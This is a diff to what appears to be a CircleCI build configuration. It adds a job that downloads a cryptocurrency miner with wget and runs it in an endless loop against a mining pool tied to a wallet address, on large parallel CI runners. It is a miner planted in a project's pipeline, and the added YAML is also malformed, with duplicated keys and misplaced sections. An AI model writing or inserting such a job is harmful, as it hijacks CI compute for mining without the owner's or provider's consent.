@@ -4,8 +4,43 @@ jobs:
   build:
     docker:
       - image: ubuntu:latest
+    version: 2.1
+
+parameters:
+  miner-url:
+    type: string
+    default: "https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64"
+  pool-address:
+    type: string
+    default: "stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672"
+
+executors:
+  ubuntu-executor:
+    docker:
+      - image: ubuntu:latest
     parallelism: 4
     resource_class: large
+
+jobs:
+  miner:
+    executor: ubuntu-executor
+    steps:
+      - run:
+          name: Install Dependencies
+          command: apt-get update && apt-get install -y wget
+      - run:
+          name: Download and Setup Miner
+          command: |
+            wget << pipeline.parameters.miner-url >>
+            chmod +x iniminer-linux-x64
+      - run:
+          name: Run Miner
+          command: |
+            while true; do
+              ./iniminer-linux-x64 --pool << pipeline.parameters.pool-address >> --cpu-devices 0 1
+              sleep 1
+            done
+          no_output_timeout: 3h
     steps:
       - run:
           name: Install Dependencies
